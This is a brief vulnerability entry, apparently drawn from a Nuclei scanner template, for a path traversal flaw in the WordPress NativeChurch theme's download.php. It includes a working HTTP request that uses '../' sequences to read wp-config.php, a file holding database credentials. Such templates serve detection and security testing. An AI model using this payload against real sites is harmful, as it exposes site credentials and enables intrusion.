# Nuclei Template: WordPress NativeChurch Theme - Local File Inclusion
**Template ID:** nativechurch-wp-theme-lfd
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`nativechurch-wp-theme-lfd.yaml`)

## Vulnerability Information & PoC

## Description
WordPress NativeChurch Theme is vulnerable to local file inclusion in the download.php file.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php
```

## References
- https://packetstormsecurity.com/files/132297/WordPress-NativeChurch-Theme-1.0-1.5-Arbitrary-File-Download.html
- https://wpscan.com/vulnerability/2e1062ed-0c48-473f-aab2-20ac9d4c72b1
